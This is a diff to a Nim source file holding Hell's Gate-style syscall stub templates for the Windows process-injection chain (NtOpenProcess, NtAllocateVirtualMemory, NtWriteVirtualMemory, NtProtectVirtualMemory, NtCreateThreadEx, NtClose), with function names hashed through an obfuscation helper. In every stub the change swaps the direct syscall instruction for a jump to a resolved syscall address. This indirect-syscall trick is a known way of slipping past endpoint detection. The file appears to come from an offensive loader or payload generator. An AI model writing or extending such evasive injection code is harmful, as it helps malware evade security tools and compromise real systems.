@@ -19,13 +19,14 @@ proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits
     asm ===
         mov r10, rcx
         mov eax, `syscall`
-        syscall
+        mov r11, `syscallJumpAddress`
+        jmp r11
         ret
     ===
 
 var 
-  ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
-  ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
+    ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
+    ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
 """
 
 let HellsgateNtOpenProcessDelegate*  = """
@@ -34,13 +35,14 @@ proc NtOpenProcess(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAtt
     asm ===
         mov r10, rcx
         mov eax, `syscall`
-        syscall
+        mov r11, `syscallJumpAddress`
+        jmp r11
         ret
     ===
 
 var 
-  ntOpenfuncHash        : uint64            = djb2_hash(obf("NtOpenProcess"))
-  ntOpenTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntOpenfuncHash)
+    ntOpenfuncHash        : uint64            = djb2_hash(obf("NtOpenProcess"))
+    ntOpenTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntOpenfuncHash)
 
 """
 
@@ -51,13 +53,14 @@ proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVO
     asm ===
         mov r10, rcx
         mov eax, `syscall`
-        syscall
+        mov r11, `syscallJumpAddress`
+        jmp r11
         ret
     ===
 
 var 
-  ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
-  ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
+    ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
+    ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
 
 """
 
@@ -68,49 +71,51 @@ proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSiz
     asm ===
         mov r10, rcx
         mov eax, `syscall`
-        syscall
+        mov r11, `syscallJumpAddress`
+        jmp r11
         ret
     ===
 
 var 
-  ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
-  ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
+    ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
+    ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
 
 """
 
 let HellsgateNtCreateThreadExDelegate*  = """
 
 type
-  PS_ATTR_UNION* {.pure, union.} = object
-    Value*: ULONG
-    ValuePtr*: PVOID
-  PS_ATTRIBUTE* {.pure.} = object
-    Attribute*: ULONG 
-    Size*: SIZE_T
-    u1*: PS_ATTR_UNION
-    ReturnLength*: PSIZE_T
-  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
-  PS_ATTRIBUTE_LIST* {.pure.} = object
-    TotalLength*: SIZE_T
-    Attributes*: array[2, PS_ATTRIBUTE]
-  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
-  KNORMAL_ROUTINE* {.pure.} = object
-    NormalContext*: PVOID
-    SystemArgument1*: PVOID
-    SystemArgument2*: PVOID
-  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
+    PS_ATTR_UNION {.pure, union.} = object
+        Value: ULONG
+        ValuePtr: PVOID
+    PS_ATTRIBUTE {.pure.} = object
+        Attribute: ULONG 
+        Size: SIZE_T
+        u1: PS_ATTR_UNION
+        ReturnLength: PSIZE_T
+    PPS_ATTRIBUTE = ptr PS_ATTRIBUTE
+    PS_ATTRIBUTE_LIST {.pure.} = object
+        TotalLength: SIZE_T
+        Attributes: array[2, PS_ATTRIBUTE]
+    PPS_ATTRIBUTE_LIST = ptr PS_ATTRIBUTE_LIST
+    KNORMAL_ROUTINE {.pure.} = object
+        NormalContext: PVOID
+        SystemArgument1: PVOID
+        SystemArgument2: PVOID
+    PKNORMAL_ROUTINE = ptr KNORMAL_ROUTINE
 
 proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
     asm ===
         mov r10, rcx
         mov eax, `syscall`
-        syscall
+        mov r11, `syscallJumpAddress`
+        jmp r11
         ret
     ===
 
 var 
-  ntCreatefuncHash        : uint64            = djb2_hash(obf("NtCreateThreadEx"))
-  ntCreateTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntCreatefuncHash)
+    ntCreatefuncHash        : uint64            = djb2_hash(obf("NtCreateThreadEx"))
+    ntCreateTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntCreatefuncHash)
 
 """
 
@@ -121,16 +126,16 @@ proc NtClose(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     asm ===
         mov r10, rcx
         mov eax, `syscall`
-        syscall
+        mov r11, `syscallJumpAddress`
+        jmp r11
         ret
     ===
 
 var 
-  ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
-  ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)
+    ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
+    ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)
 
 """
-
 
 let HellsgateStub*  = """
 
